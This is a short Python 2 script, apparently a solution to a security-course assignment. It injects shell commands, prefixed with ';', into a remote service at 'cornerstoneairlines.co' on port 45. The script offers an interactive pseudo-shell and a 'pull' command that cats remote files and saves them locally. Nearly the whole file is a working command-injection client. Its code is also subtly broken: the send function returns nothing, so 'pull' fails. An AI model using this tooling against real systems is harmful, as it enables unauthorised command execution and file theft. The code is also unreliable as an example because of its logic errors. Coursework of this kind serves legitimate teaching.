"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    garbage = s.recv(1024)
    s.send(cmd + "\n")
    time.sleep(2)
    data = s.recv(1024)
    print(data)
    s.close()

if __name__ == '__main__':
    command = raw_input("shell: ")
    while(command != "quit"):
        if("pull" in command):
            paths = command.split()
            x = execute_cmd("cat" + " " + paths[1])
            f = open(paths[2], 'w')
            f.write(x)
            f.close()
        if(command == "help"):
            print("1. shell Drop into an interactive shell and allow users to gracefully exit")
            print("2. pull <remote-path> <local-path>")
            print("3. help Shows this help menu")
            print("4. quit Quit the shell")
        if(command == "shell"):
            in_command = raw_input("$:")
            total_command = ""
            if("cd" in in_command):
                total_command = ';' + in_command
            while(in_command != "quit"):
                if("cd" in in_command):
                    execute_cmd(total_command)
                else:
                    execute_cmd(total_command + ";" + in_command)
                in_command = raw_input("$:")
                if("cd" in in_command):
                    total_command = total_command + ";" + in_command

        command = raw_input("shell:")


            
            


